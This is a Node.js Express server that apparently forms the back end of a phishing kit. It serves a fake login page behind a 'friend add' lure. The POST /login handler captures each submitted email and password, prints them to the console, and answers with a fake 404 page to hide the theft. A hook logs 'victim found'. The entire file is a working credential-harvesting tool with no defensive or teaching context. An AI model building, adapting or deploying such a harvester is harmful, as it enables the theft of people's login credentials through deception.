const express = require('express');
var bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use(express.static('fontend'));
app.use(express.static('addfriend'));

app.get('/',(req,res)=>{
 res.sendFile(__dirname + "/addfriend/indax.html");
})

app.get('/login',(req,res)=>{
 res.sendFile(__dirname + "/fontend/indax.html");
});

app.post("/login", (req,res)=>{
  const email = req.body.email;
  const password = req.body.password;
  console.log(`[×] Email : ${email}`);
  console.log(`[×] Password : ${password}`);
  res.send('<h1>404 error you are not valid url</h1> ')
})
app.use((req,res)=>{
  res.send("<h1>404 error You are not valid page</h1>");
});

app.on('connection',()=>{
 console.log("victim found")
});

app.listen(3000,()=>{
  console.log('main link: http://localhost:3000/login');
});
